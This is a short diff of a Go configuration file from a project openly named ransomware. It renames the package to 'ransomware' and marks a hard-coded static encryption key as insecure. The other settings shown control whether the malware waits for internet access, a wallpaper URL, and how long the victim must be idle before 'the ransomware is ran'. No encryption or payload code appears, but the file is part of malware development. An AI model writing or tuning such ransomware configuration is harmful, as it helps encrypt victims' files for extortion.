@@ -1,4 +1,4 @@
-package ransom
+package ransomware
 
 import "time"
 
@@ -18,7 +18,7 @@ const WallpaperUrl = ""
 
 //if this is false it will use the static key below and won't wait for the user to be online
 const WaitForInternet = true
-const StaticKey = "12345678901234567890123456789012"
+const StaticKey = "12345678901234567890123456789012" //insecure
 
 //time to wait until the user is considered afk and the ransomware is ran
 const WaitAfk = time.Second * 5 //for debugging purposes
